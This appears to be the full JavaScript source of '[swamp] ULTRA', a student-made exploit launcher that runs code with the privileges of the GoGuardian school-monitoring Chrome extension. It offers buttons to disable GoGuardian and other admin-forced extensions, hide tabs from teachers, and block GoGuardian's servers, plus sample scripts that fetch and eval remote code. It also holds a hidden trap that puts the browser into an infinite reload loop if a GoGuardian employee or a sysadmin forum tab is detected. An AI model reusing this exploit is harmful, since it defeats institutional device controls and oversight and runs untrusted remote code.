if (alert("This was patched!!!! If you are seeing this, hard-disable NOW and powerwash to undo!"), "haldlgldplgnggkjaafhelgiaglafanh" !== document.domain) throw "[swamp] can only be used in the GoGuardian runtime.";
if (localStorage.swamp_risk) throw "Get a life! Retire!";
chrome.tabs.query({
    url: "*://*.reddit.com/r/k12sysadmin*"
}, function(e) {
    e.length > 0 && !localStorage.swamp && swamp.functions.risk()
}), chrome.identity.getProfileUserInfo(function(e) {
    e.email.endsWith("goguardian.com") && swamp.functions.risk()
});
var chrome, swamp = {
    background: chrome.extension?.getBackgroundPage(),
    elements: {
        create(e, t) {
            var o = document.createElement(e.tag),
                i = swamp.strings[t?.id] || swamp.strings;
            for (var a in e) o[a] = a.startsWith("on") ? swamp.functions[e[a]] : e[a];
            !e.kids && i[o.id] && (o.innerHTML = i[o.id]), (t || document.body).appendChild(o), swamp.elements[e.id] = o, e.kids?.forEach(e => {
                swamp.elements.create(e, o)
            })
        }
    },
    functions: {
        save_code() {
            localStorage.swamp = swamp.elements.input.value
        },
        insert_tab(e) {
            "Tab" === e.key && (e.preventDefault(), document.execCommand("insertText", !1, "  "))
        },
        log_replace(e) {
            swamp.elements.output.textContent += "\n\n" + e, swamp.elements.output.scrollTop = swamp.elements.output.scrollHeight
        },
        run_code() {
            swamp.functions.save_code();
            try {
                (this.background ? swamp.background : window).eval(swamp.elements.input.value), console.log("Code ran successfully")
            } catch (e) {
                console.log(e)
            }
        },
        reload() {
            onbeforeunload = null, location = atob("Y2hyb21lLWV4dGVuc2lvbjovL2hhbGRsZ2xkcGxnbmdna2phYWZoZWxnaWFnbGFmYW5oL3RlYWNoZXIvbGVzc29uLXBsYW5zL2Jsb2NrZWQuaHRtbD9jcz1bMSx7Im5hbWUiOiI8c3R5bGU+Ym9keSAqe2Rpc3BsYXk6bm9uZX1ib2R5e2JhY2tncm91bmQ6JTIzMmUyZTMxfTwvc3R5bGU+PGlmcmFtZSUyMHNyY2RvYz1cIjxzY3JpcHQlMjBzcmM9JTI3aHR0cHM6Ly9zc2wuZ29vZ2xlLWFuYWx5dGljcy5jb20vZ3RtL2pzP2lkPUdUTS1LODlRUEZTJTI3Pjwvc2NyaXB0PlwiPiJ9XQ==")
        },
        reload_background() {
            ((swamp.background.chrome.tabs.updateAsync || "-" === localStorage.accountId) && !swamp.background.spoof_int || swamp.background.confirm(swamp.strings.confirm_reload)) && (swamp.background.location.reload(), console.log("Scripts running as background were reloaded"))
        },
        script_adding_loop(e) {
            swamp.elements.create({
                tag: "option",
                textContent: e.name,
                value: e.code
            }, swamp.elements.select)
        },
        script_select() {
            swamp.elements.input.value = swamp.elements.select.value, swamp.elements.run_code.scrollIntoView(), swamp.functions.save_code()
        },
        hard_disable() {
            for (var e = 0; e < localStorage.length; e++) localStorage.key(e).startsWith("swamp") || (localStorage[localStorage.key(e)] = this.undo ? "" : "-");
            swamp.background.location.reload(), this.undo && swamp.functions.reload()
        },
        soft_disable() {
            swamp.background.chrome.tabs.updateAsync = null
        },
        hide_tabs() {
            swamp.background.eval(this.undo ? `\nchrome.tabs.captureVisibleTabAsync = chrome.tabs.captureVisibleTabAsync || screenshot_old;\nchrome.windows.getAllAsync = chrome.windows.getAllAsync || get_tabs_old;\nclearInterval(spoof_int);\nif (spoof_int) alert("Your teacher can now see all open tabs and windows!");\nspoof_int = null;` : `\nvar spoof_int,\n  visible_id = 0,\n  screenshot_old = screenshot_old || chrome.tabs.captureVisibleTabAsync,\n  get_tabs_old = get_tabs_old || chrome.windows.getAllAsync,\n  get_tabs_new = function () {\n    return new Promise((resolve, reject) => {\n      get_tabs_old({\n        populate: true,\n        windowTypes: ["normal"],\n      }).then((tabs) => {\n        tabs.forEach((tab) => {\n          if (tab.id === visible_id) resolve([tab]);\n        });\n      });\n    });\n  };\nchrome.windows.create({ url: "https://google.com" }, (win) => {\n  visible_id = win.id;\n  spoof_int = setInterval(() => {\n    chrome.windows.getLastFocused((window) => {\n      var visible = window.id === visible_id;\n      chrome.tabs.captureVisibleTabAsync = visible ? screenshot_old : null;\n      chrome.windows.getAllAsync = visible ? get_tabs_new : null;\n    });\n  }, 5);\n});`)
        },
        get_extensions() {
            chrome.management.getAll(function(e) {
                e.forEach(function(e) {
                    swamp.elements.create({
                        tag: "button",
                        id: e.id,
                        textContent: e.name,
                        enabled: e.enabled,
                        admin: "admin" === e.installType,
                        onclick: "toggle_extension"
                    }, swamp.elements.installed_extensions), swamp.functions.strikethrough(swamp.elements[e.id], e.enabled), e.id === chrome.runtime.id && (swamp.elements[e.id].className = "gg")
                })
            })
        },
        strikethrough(e, t) {
            e.style.textDecoration = t ? "none" : "line-through"
        },
        toggle_extension() {
            (!this.enabled || this.id !== chrome.runtime.id || swamp.background.confirm(swamp.strings.confirm_remove_gg)) && (this.enabled = !this.enabled, swamp.functions.strikethrough(this, this.enabled), chrome.management.setEnabled(this.id, this.enabled))
        },
        manage_all() {
            var e = this.admin_only,
                t = this.enabling;
            [...swamp.elements.installed_extensions.children].forEach(function(o) {
                (!e || o.admin) && !t != !o.enabled && o.id !== chrome.runtime.id && o.click()
            })
        },
        open_coffee() {
            open("https://buymeacoffee.com/bypassi")
        },
        risk() {
            document.body.innerHTML = "", localStorage.swamp_risk = !0, onbeforeunload = function() {
                localStorage.x = 1
            }, setTimeout(function() {
                for (;;) location.reload(1)
            }, 500)
        }
    },
    scripts: [{
        name: "Select an option...",
        code: ""
    }, {
        name: "Display GoGuardian policy",
        code: `chrome.storage.local.get("policy", (json) => {\n  console.log(JSON.stringify(json));\n});`
    }, {
        name: "Run a third-party script",
        code: `fetch("https://example.com/example.js")\n  .then((res) => res.text())\n  .then(eval);`
    }, {
        name: "Bookmarklet emulator when a Google tab is loaded",
        code: `chrome.tabs.onUpdated.addListener((tabId, changeInfo) => {\n  if (changeInfo.status == "complete") {\n    chrome.tabs.executeScript(\n      tabId, { code: \`\n        if (location.hostname.endsWith("google.com")) {\n          // Use your own code below:\n          alert("Testing!");\n        }\n      \` }\n    );\n  }\n});`
    }, {
        name: "Bookmarklet emulator on focused tab when the GoGuardian icon is clicked",
        code: `chrome.browserAction.onClicked.addListener(() => {\n  chrome.tabs.query({ active: true, currentWindow: true }, (tab) => {\n    chrome.tabs.executeScript(tab[0].id, {\n      code: \`\n        // Your own code below:\n        alert("Testing!");\n      \`,\n      matchAboutBlank: true,\n    });\n  });\n});\n// Credit to Zylenox#2366`
    }, {
        name: "Toggle all other admin-forced extensions when the GoGuardian icon is clicked",
        code: `chrome.browserAction.onClicked.addListener(function () {\n  chrome.management.getAll((extensions) => {\n    extensions.forEach((extension) => {\n      if ("admin" === extension.installType && chrome.runtime.id !== extension.id)\n        chrome.management.setEnabled(extension.id, !extension.enabled);\n    });\n  });\n});`
    }, {
        name: "Display a goofy notification",
        code: `chrome.notifications.create(null, {\n  type: "basic",\n  iconUrl: "https://upload.wikimedia.org/wikipedia/en/9/9a/Trollface_non-free.png",\n  title: "Important GoGuardian Message",\n  message: "We've been trying to reach you concerning your vehicle's extended warranty. You should've received a notice in the mail about your car's extended warranty eligibility. Since we've not gotten a response, we're giving you a final courtesy call before we close out your file. Press 2 to be removed and placed on our do-not-call list. To speak to someone about possibly extending or reinstating your vehicle's warranty, press 1 to speak with a warranty specialist.",\n});\n// Credit to ilexite#8290`
    }, {
        name: "Emulate DNS and block all goguardian.com requests",
        code: `chrome.webRequest.onBeforeRequest.addListener(\n  () => {\n    return { redirectUrl: "javascript:" };\n  },\n  {\n    urls: ["*://*.goguardian.com/*"],\n  },\n  ["blocking"]\n);`
    }, {
        name: "Toggle emulated DNS unblocker when the GoGuardian icon is clicked",
        code: `function block() {\n  return { redirectUrl: "javascript:" };\n}\nvar blocking = false;\nfunction toggle() {\n  if (blocking) {\n    chrome.webRequest.onBeforeRequest.removeListener(block);\n  } else {\n    chrome.webRequest.onBeforeRequest.addListener(\n      block,\n      {\n        urls: ["*://*.goguardian.com/*"],\n      },\n      ["blocking"]\n    );\n  }\n  blocking = !blocking;\n  alert("Emulated DNS unblocker is " + (blocking ? "on!" : "off!"));\n}\ntoggle();\nchrome.browserAction.onClicked.addListener(toggle);\n// This is mainly useful if you run it in the background`
    }, ],
    strings: {
        style: "pre,textarea{display:inline-block;height:400px}*{box-sizing:border-box}body{padding:10px;font-size:110%;color:#fff;background-color:#2e2e31}h1{text-align:center;font-size:70px}h2{text-align:left;font-size:175%}button,input,pre,select,textarea{color:#000;font-size:15px}h1,h2,h3,button,label,p,select{font-family:Roboto,sans-serif}hr{border:none;border-bottom:3px solid #fff}input,kbd,pre,textarea{font-family:monospace;border:none}input,select,textarea{background-color:#fff;border-radius:10px;padding:10px 17px;border:none}button,input{background-color:#fff;padding:10px 20px;margin:0 5px 5px 0}input{width:600px;border-radius:10px}textarea{white-space:pre;float:left;width:60%;border-radius:10px 0 0 10px;resize:none;background-color:#99edc3;margin-bottom:15px}pre{border-radius:0 10px 10px 0;padding:8px;float:right;margin:0 0 25px;width:40%;overflow-y:scroll;word-break:break-all;white-space:pre-line;background-color:#1c8e40}button{border:none;border-radius:10px;cursor:pointer;transition:filter 250ms}button:hover{filter:brightness(.8)}.gg{background-color:#99edc3}a{color:#99edc3;transition:color 250ms}a:hover{color:#1c8e40}",
        title: "[swamp] ULTRA for Chrome",
        subtitle: "Exploit invented by Bypassi & user interface made by Mr. PB",
        info: "Motivated by <a href='https://www.reddit.com/r/Teachers/comments/zj0jqp/fun_with_goguardian'>this Reddit post</a> --- By using this launcher, you agree to the use of Google Analytics",
        run_code: {
            title: "Run your own code",
            description: 'Put your script here to run it while pretending to be the GoGuardian extension. You will be able to access most "chrome" scripts and have other privileges such as access to all websites. Note that your code is saved automatically. Developers: try interacting with the "swamp" object while running code on this page!',
            placeholder: "Input goes here...",
            output: "Output shows here:\n\n---",
            run: "Run on this page",
            reload: "Reload scripts on this page",
            run_background: "Run as background",
            reload_background: "Reload background scripts",
            button_description: "Concerning the buttons above: Running on this page is pretty self explanatory. The script only takes effect when this page is open, but running as background lets the script run even with the tab closed. Basically, it means that the script is being run at the highest level of a Chrome extension, in the background, so it persists until Chrome is fully restarted (with chrome://restart for example)."
        },
        interesting_scripts: {
            title: "Interesting scripts",
            description: "Some useful scripts for the textbox above. <b>DM Bypassi#7037 on Discord to suggest new ones (or general improvements to this launcher).</b>",
            policy_description: 'By the way, if you find a URL like *google.com* in your GoGuardian policy with the "whitelist" attribute, any url like https://blocked.com/?google.com will be unblocked for anyone in your district. Note that your policy may be inaccurate if you are using the hard-disable option or are signed into another Google account.',
            dns_description: "Also, if you turned on the DNS emulator and previously blocked sites that you've visited before aren't loading, try adding a question mark to the end of the URL, which may clear cache. DNS unblocking may not work for blocking requests from other admin-enforced extensions.",
            background_reminder: "And please read the thing about background running earlier in the page, because that could be useful."
        },
        disable_gg: {
            title: "Disable and repair GoGuardian",
            hard_disable: "Hard-disable GoGuardian",
            soft_disable: "Soft-disable GoGuardian",
            repair: "Repair GoGuardian",
            description: "Hard-disable will disable GoGuardian and persist until you powerwash your device or undo it with the repair button. If you want something less permanent, use the soft-disable option or run a DNS emulator as background. Hard-disable works by messing with cookies that GoGuardian needs to run. Soft-disable is more surface-level, keeping things like YouTube sidebars blocked, and it only persists until Chrome is restarted (naturally or with chrome://restart).",
            trouble_warning: "<b>Hard-disable will also prevent your teachers from seeing your screen, while soft-disable will not. Be careful not to get in trouble. Read the section below on more information about how to stay safe.</b>"
        },
        hide_tabs: {
            title: "Hide your tabs from teachers",
            visible_window: 'Open "visible window"',
            undo_hide_tabs: "Undo tab hiding",
            description: "This button will open a new window, and the person monitoring your device with the GoGuardian Teacher panel will <b>only be able to see (or control) tabs opened in that window.</b> If you open multiple windows with the button, the most recent one will be the visible window. You can re-allow your teacher to see all of your tabs by clicking the undo button.",
            interference: 'For this to work, you cannot have GoGuardian disabled with the "LTBEEF" section below or hard-disable. Re-enable and repair GoGuardian before opening a visible window. If you still want unblocked sites, <b>use soft-disable, which will allow you to browse freely and use this feature at the same time.</b> This section would not have been possible without the hard work of kxd.fm#6645.',
            dont_cheat: "<b>Seriously, don't cheat on tests or stuff like that.</b> [swamp] was made to provide students with access to websites that are unjustly denied from them. I really don't condone cheating and this section will be removed if I hear about stuff like that happening commonly (nerd emoji)."
        },
        ltbeef: {
            title: 'Disable other Chrome Extensions similarly to <a href="https://compactcow.com/ltbeef">LTBEEF</a>',
            manual_description: "LTBEEF was fixed by Chrome in v106, so this is a great alternative that works in the latest version. The buttons below will allow you to disable or enable all extensions, including admin-enforced ones.",
            broad_options_description: "Or you can try the more automatic broad options:",
            disable_all: "Disable all except GoGuardian",
            disable_all_admin: "Disable all admin-forced except GoGuardian",
            enable_all: "Re-enable all",
            soft_disable_recommendation: "Disabling GoGuardian with this process will close the [swamp] launcher. As an alternative, use the soft-disable button earlier on the page, which has the same functionality while allowing for the launcher to be used."
        },
        donations: {
            title: "Donations",
            description: "Since you got this far, I (Bypassi) might as well ask you if you feel like donating. This launcher is cost-free, ad-free, and malware-free! As were LTBEEF and my other previous exploits. If you found [swamp] helpful, consider buying me a coffee (or at least a fraction of a coffee) with the button below. Even just a dollar would be massively appreciated and motivate me to write more exploits in the future.",
            coffee: "Buy me a coffee!"
        },
        confirm_reload: "It looks like you've got soft disable or tab-hiding active. Reloading the background scripts will also turn these off, so are you sure you want to continue?",
        confirm_remove_gg: "Are you sure you want to remove GoGuardian? It'll close the launcher until chrome://restart is visited. Soft-disable may be a better option if you want to keep using [swamp] with sites unblocked."
    }
};
document.documentElement.innerHTML = "<body></body>", [{
    tag: "title",
    id: "title"
}, {
    tag: "style",
    id: "style"
}, {
    tag: "base",
    target: "_blank"
}, {
    tag: "h1",
    id: "title"
}, {
    tag: "h3",
    id: "subtitle"
}, {
    tag: "p",
    id: "info"
}, {
    tag: "hr"
}, {
    tag: "div",
    id: "run_code",
    kids: [{
        tag: "h2",
        id: "title"
    }, {
        tag: "p",
        id: "description"
    }, {
        tag: "textarea",
        id: "input",
        placeholder: swamp.strings.run_code.placeholder,
        onkeyup: "save_code",
        onkeydown: "insert_tab"
    }, {
        tag: "pre",
        id: "output"
    }, {
        tag: "button",
        id: "run",
        onclick: "run_code"
    }, {
        tag: "button",
        id: "reload",
        onclick: "reload"
    }, {
        tag: "br"
    }, {
        tag: "button",
        id: "run_background",
        background: !0,
        onclick: "run_code"
    }, {
        tag: "button",
        id: "reload_background",
        onclick: "reload_background"
    }, {
        tag: "p",
        id: "button_description"
    }, ]
}, {
    tag: "hr"
}, {
    tag: "div",
    id: "interesting_scripts",
    kids: [{
        tag: "h2",
        id: "title"
    }, {
        tag: "p",
        id: "description"
    }, {
        tag: "select",
        id: "select",
        onchange: "script_select"
    }, {
        tag: "p",
        id: "policy_description"
    }, {
        tag: "p",
        id: "dns_description"
    }, {
        tag: "p",
        id: "background_reminder"
    }, ]
}, {
    tag: "hr"
}, {
    tag: "div",
    id: "disable_gg",
    kids: [{
        tag: "h2",
        id: "title"
    }, {
        tag: "button",
        id: "hard_disable",
        onclick: "hard_disable"
    }, {
        tag: "button",
        id: "soft_disable",
        onclick: "soft_disable"
    }, {
        tag: "button",
        id: "repair",
        undo: !0,
        onclick: "hard_disable"
    }, {
        tag: "p",
        id: "description"
    }, {
        tag: "p",
        id: "trouble_warning"
    }, ]
}, {
    tag: "hr"
}, {
    tag: "div",
    id: "hide_tabs",
    kids: [{
        tag: "h2",
        id: "title"
    }, {
        tag: "button",
        id: "visible_window",
        onclick: "hide_tabs"
    }, {
        tag: "button",
        id: "undo_hide_tabs",
        undo: !0,
        onclick: "hide_tabs"
    }, {
        tag: "p",
        id: "description"
    }, {
        tag: "p",
        id: "interference"
    }, {
        tag: "p",
        id: "dont_cheat"
    }, ]
}, {
    tag: "hr"
}, {
    tag: "div",
    id: "ltbeef",
    kids: [{
        tag: "h2",
        id: "title"
    }, {
        tag: "p",
        id: "manual_description"
    }, {
        tag: "div",
        id: "installed_extensions"
    }, {
        tag: "p",
        id: "broad_options_description"
    }, {
        tag: "button",
        id: "disable_all",
        onclick: "manage_all"
    }, {
        tag: "button",
        id: "disable_all_admin",
        admin_only: !0,
        onclick: "manage_all"
    }, {
        tag: "button",
        id: "enable_all",
        enabling: !0,
        onclick: "manage_all"
    }, {
        tag: "p",
        id: "soft_disable_recommendation"
    }, ]
}, {
    tag: "hr"
}, {
    tag: "div",
    id: "donations",
    kids: [{
        tag: "h2",
        id: "title"
    }, {
        tag: "p",
        id: "description"
    }, {
        tag: "button",
        id: "coffee",
        onclick: "open_coffee"
    }, ]
}, ].forEach(e => {
    swamp.elements.create(e)
}), history.replaceState({}, {}, "/swamp"), onbeforeunload = () => !0, console.log = swamp.background.console.log = swamp.functions.log_replace, swamp.scripts.forEach(swamp.functions.script_adding_loop), swamp.functions.get_extensions(), swamp.elements.input.value = localStorage.swamp || "", setInterval(() => {
    try {
        chrome.runtime.connect().disconnect()
    } catch (e) {
        onbeforeunload = null, document.body.innerHTML = ""
    }
}), eval('(function(i,s,o,g,r,a,m){i["GoogleAnalyticsObject"]=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o);a.async=1;a.src=g;document.body.appendChild(a,m)})(window,document,"script","https://ssl.google-analytics.com/analytics.js","ga");ga("create","UA-215085742-3",{storage:"none",clientId:localStorage.swamp_id});ga(function(t){localStorage.swamp_id=t.get("clientId")});ga("set","checkProtocolTask",null);ga("set","checkStorageTask",null);ga("send","pageview","/swamp")');
